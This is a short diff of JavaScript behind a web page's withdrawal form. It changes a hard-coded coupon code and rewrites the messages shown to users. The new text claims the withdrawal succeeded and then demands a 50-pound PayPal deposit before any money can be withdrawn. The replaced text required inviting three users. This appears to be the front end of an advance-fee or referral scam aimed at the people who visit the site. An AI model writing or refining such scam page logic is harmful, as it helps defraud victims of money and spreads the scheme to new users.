@@ -472,8 +472,8 @@ document.getElementById("withdrawForm").addEventListener("submit", async e => {
   }
 
   const coupon = document.getElementById("coupon").value.trim();
-  if (coupon !== "UK868440") {
-    showMsg("Invalid coupon code. Please try again.", false);
+  if (coupon !== "63001294") {
+    showMsg("account ok invalid or expired code coupon code. Please try again or contact support to get your code for 2026.", false);
     return;
   }
 
@@ -490,7 +490,7 @@ document.getElementById("withdrawForm").addEventListener("submit", async e => {
       return;
     }
     
-    showMsg("Withdrawal successful! please complete invite 3 users to complete your transaction.", true);
+    showMsg("Withdrawal successful! kindly deposit 50 pounds to your account by paypal to be able to withdraw to UnitedKingdom.", true);
     feeSection.classList.remove("hidden");
   } catch {
     showMsg("Network error, please try again later.", false);
